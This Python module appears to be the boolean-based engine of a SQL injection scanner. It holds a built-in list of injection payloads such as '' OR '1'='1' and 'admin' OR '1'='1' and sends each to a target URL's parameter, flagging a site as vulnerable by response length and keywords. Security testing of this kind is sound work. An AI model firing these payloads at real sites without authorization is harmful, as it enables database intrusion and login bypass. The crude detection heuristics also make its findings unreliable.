"""
Boolean-Based SQL Injection Engine
"""

import os
from utils.http_client import HttpClient
from config import MAX_PAYLOADS_PER_TEST, SKIP_DUPLICATE_PAYLOADS, NORMALIZE_PAYLOADS, SMART_PAYLOAD_ORDERING

class BooleanEngine:
    def __init__(self):
        self.http_client = HttpClient()
        self.payloads_file = os.path.join("payloads", "boolean_payloads.txt")
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load boolean-based payloads from file with smart handling"""
        default_payloads = [
            "' OR '1'='1", "' OR '1'='2", "' AND '1'='1", "' AND '1'='2",
            "' OR 1=1", "' OR 1=2", "' AND 1=1", "' AND 1=2",
            "1' OR '1'='1", "1' OR '1'='2", "1' AND '1'='1", "1' AND '1'='2",
            "admin' OR '1'='1", "admin' OR '1'='2",
            "' OR 'a'='a", "' OR 'a'='b", "' AND 'a'='a", "' AND 'a'='b",
            "' OR 1=1--", "' OR 1=2--", "' AND 1=1--", "' AND 1=2--",
            "' OR '1'='1'--", "' OR '1'='2'--",
            "') OR ('1'='1", "') OR ('1'='2", "') AND ('1'='1", "') AND ('1'='2",
            "\" OR \"1\"=\"1", "\" OR \"1\"=\"2", "\" AND \"1\"=\"1", "\" AND \"1\"=\"2",
            "' OR '1'='1' /*", "' OR '1'='2' /*", "' AND '1'='1' /*", "' AND '1'='2' /*",
            "' OR 1=1#", "' OR 1=2#", "' AND 1=1#", "' AND 1=2#",
            "1 OR 1=1", "1 OR 1=2", "1 AND 1=1", "1 AND 1=2",
            "1' OR '1'='1' OR '1'='1", "1' OR '1'='2' OR '1'='1",
            "' OR username='admin' OR '1'='1", "' OR username='admin' OR '1'='2"
        ]
        
        try:
            if os.path.exists(self.payloads_file):
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                # Normalize payloads if enabled
                if NORMALIZE_PAYLOADS:
                    payloads = [' '.join(p.split()) for p in payloads]
                
                # Remove duplicates if enabled
                if SKIP_DUPLICATE_PAYLOADS:
                    payloads = list(dict.fromkeys(payloads))  # Preserves order
                
                # Smart ordering: simple payloads first
                if SMART_PAYLOAD_ORDERING:
                    payloads = self._order_payloads(payloads)
                
                # Apply limit if specified
                if MAX_PAYLOADS_PER_TEST:
                    payloads = payloads[:MAX_PAYLOADS_PER_TEST]
                
                print(f"   Loaded {len(payloads)} unique boolean payloads")
                return payloads
            else:
                print(f"   Payload file not found: {self.payloads_file}, using defaults")
                return default_payloads
        except Exception as e:
            print(f"   Error loading payloads: {e}, using defaults")
            return default_payloads
    
    def _order_payloads(self, payloads):
        """Order payloads by complexity - simple first, complex later"""
        def complexity_score(payload):
            score = len(payload)  # Length
            score += payload.count('(') * 2  # Parentheses
            score += payload.count('SELECT') * 5  # Subqueries
            score += payload.count('UNION') * 5  # Complex operations
            return score
        
        return sorted(payloads, key=complexity_score)
    
    def test(self, param, url):
        """Test for boolean-based SQL injection with enhanced detection"""
        try:
            # Get baseline response
            baseline_response = self.http_client.get(url, {param: "1"})
            if not baseline_response:
                return None
            
            baseline_len = len(baseline_response)
            baseline_lower = baseline_response.lower()
            
            for payload in self.payloads:
                try:
                    # Test with payload
                    test_response = self.http_client.get(url, {param: payload})
                    
                    if not test_response:
                        continue
                    
                    test_len = len(test_response)
                    test_lower = test_response.lower()
                    
                    # Enhanced detection logic
                    if baseline_len > 0 and test_len > 0:
                        # 1. Check length difference
                        difference_ratio = abs(baseline_len - test_len) / baseline_len
                        
                        # 2. Check for new content patterns
                        new_content = self._has_new_patterns(test_lower, baseline_lower)
                        
                        # 3. Check for SQL success indicators
                        sql_indicators = self._check_sql_indicators(test_lower)
                        
                        # Multiple detection methods increase accuracy
                        if difference_ratio > 0.2 or new_content or sql_indicators:
                            return {
                                "vulnerable": True,
                                "payload": payload, 
                                "response": test_response,
                                "evidence": self._generate_evidence(baseline_len, test_len, difference_ratio, new_content, sql_indicators)
                            }
                            
                except Exception as e:
                    continue
            
            return None
        except Exception as e:
            print(f"   Boolean test error: {e}")
            return None
    
    def _has_new_patterns(self, test_response, baseline_response):
        """Check if test response has significantly different patterns"""
        # Look for typical successful boolean injection patterns
        success_patterns = ['admin', 'root', 'user', 'login', 'password', 'email', 'username']
        
        baseline_matches = sum(1 for p in success_patterns if p in baseline_response)
        test_matches = sum(1 for p in success_patterns if p in test_response)
        
        return test_matches > baseline_matches + 2
    
    def _check_sql_indicators(self, response):
        """Check for SQL success indicators in response"""
        indicators = ['true', 'success', '1=1', 'condition', 'match']
        return sum(1 for ind in indicators if ind in response) >= 2
    
    def _generate_evidence(self, baseline_len, test_len, diff_ratio, new_content, sql_indicators):
        """Generate detailed evidence message"""
        evidence_parts = []
        
        if diff_ratio > 0.2:
            evidence_parts.append(f"Length: {baseline_len}→{test_len} ({diff_ratio:.1%} change)")
        if new_content:
            evidence_parts.append("New data patterns detected")
        if sql_indicators:
            evidence_parts.append("SQL success indicators found")
        
        return " | ".join(evidence_parts) if evidence_parts else "Boolean condition difference detected"